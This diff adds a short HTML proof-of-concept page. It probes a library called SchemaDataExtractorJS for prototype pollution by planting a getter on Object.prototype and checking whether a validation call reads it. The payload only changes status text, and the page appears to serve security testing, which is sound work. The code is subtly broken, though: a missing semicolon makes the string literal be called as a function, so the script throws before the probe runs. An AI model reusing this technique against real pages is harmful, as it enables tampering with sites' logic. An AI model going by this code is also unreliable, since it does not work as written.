@@ -1,0 +1,17 @@
+<!doctype html>
+<h1 id="status">Check...</h1>
+<script>
+const status = document.getElementById('status');
+const newScheme = "https://schema.org/MySchema"
+(function wait() {
+  if (!window.SchemaDataExtractorJS) return setTimeout(wait, 500);
+
+  Object.defineProperty(Object.prototype, newScheme, {
+    get() { status.innerText = "[+] Policy accessed via prototype"; }
+  });
+
+  console.log(
+    SchemaDataExtractorJS.isValidBaseSchemaType(newScheme)
+  );
+})();
+</script>
